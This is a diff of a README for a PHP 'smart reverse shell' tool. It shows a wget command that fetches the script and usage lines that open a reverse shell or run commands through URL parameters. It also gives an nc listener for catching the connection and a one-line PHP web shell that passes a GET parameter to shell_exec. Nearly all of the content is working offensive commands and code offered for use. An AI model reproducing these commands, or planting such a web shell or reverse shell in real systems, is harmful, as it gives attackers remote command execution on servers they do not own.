@@ -1,29 +1,24 @@
 # PHP Smart Reverse Shell scripts
+A smarter shell script
+```shell
+wget -O srs.php https://raw.githubusercontent.com/GramThanos/php-smart-reverse-shell/master/srs.php
+```
 
 ## Script Commands
-Call reverse shell from console
-```shell
-php ./srs.php 127.0.0.1 1234
-```
-Call reverse shell from url
-```url
-https://example.com/srs.php?ip=127.0.0.1&port=1234
-```
-Run command from url
-```url
-https://example.com/srs.php?c=ls%20-la
-```
-Run command from url (redirect errors to stdout)
-```url
-https://example.com/srs.php?r=ls%20-la
-```
-## Usefull commands
+ - Call reverse shell from console `php ./srs.php 127.0.0.1 1234`
+ - Call reverse shell from url `https://example.com/srs.php?ip=127.0.0.1&port=1234`
+ - Run command from url `https://example.com/srs.php?c=ls%20-la`
+ - Run command from url `https://example.com/srs.php?r=ls%20-la`(redirect errors to stdout)
 
-Wait for reverse shell connection
+## Other commands
+
+### Sockets
+Wait for a reverse shell connection
 ```shell
 nc -l 127.0.0.1 4444
 ```
 
+### PHP
 Executing shell code with PHP
 ```PHP
 <?php echo shell_exec($_GET['command']);?>
